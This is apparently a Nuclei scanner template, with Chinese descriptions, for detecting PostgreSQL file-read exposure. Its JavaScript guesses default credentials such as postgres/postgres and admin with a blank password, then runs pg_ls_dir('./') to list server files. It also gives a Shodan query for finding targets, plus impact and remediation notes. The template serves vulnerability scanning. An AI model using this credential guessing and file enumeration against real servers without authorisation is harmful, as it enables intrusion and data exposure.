id: pgsql-file-read

info:
  name: PostgreSQL 数据库函数文件读取（服务漏洞）
  author: pussycat0x
  severity: high
  description: |
    PostgreSQL 服务接受模板尝试的凭据后，可能允许数据库用户调用目录或文件读取相关函数访问服务器本地文件系统。该模板使用内置凭据登录 postgres 数据库并执行 pg_ls_dir('./')，以返回目录内容作为文件系统读取能力的验证依据。
  impact: |
    - 数据库用户可读取服务器本地文件，可能泄露系统配置、密钥、环境变量或应用凭据。
    - 文件读取能力还可帮助攻击者理解主机环境，为后续权限提升或横向移动提供材料。
  remediation: |
    - 撤销非必要数据库用户的文件读取相关权限，避免授予高权限角色给应用账号。
    - 移除弱凭据，限制 PostgreSQL 访问来源，并审计异常文件读取函数调用。
  reference:
    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-read
  metadata:
    verified: true
    max-request: 8
    shodan-query: "product:\"PostgreSQL\""
    vendor: postgresql
    product: postgresql
  tags: js,network,postgresql,authenticated,enum,discovery
javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      const postgres = require('nuclei/postgres');
      const client = new postgres.PGClient;
      connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, "select pg_ls_dir('./');");
      Export(connected);

    args:
      Host: "{{Host}}"
      Port: 5432
      User: "{{usernames}}"
      Pass: "{{password}}"
      Db: "{{database}}"

    payloads:
      usernames:
        - postgres
        - admin
      password:
        - postgres
        -
        - 123
        - amber
      database:
        - postgres

    attack: clusterbomb

    extractors:
      - type: json
        json:
          - '.Rows[].pg_ls_dir'
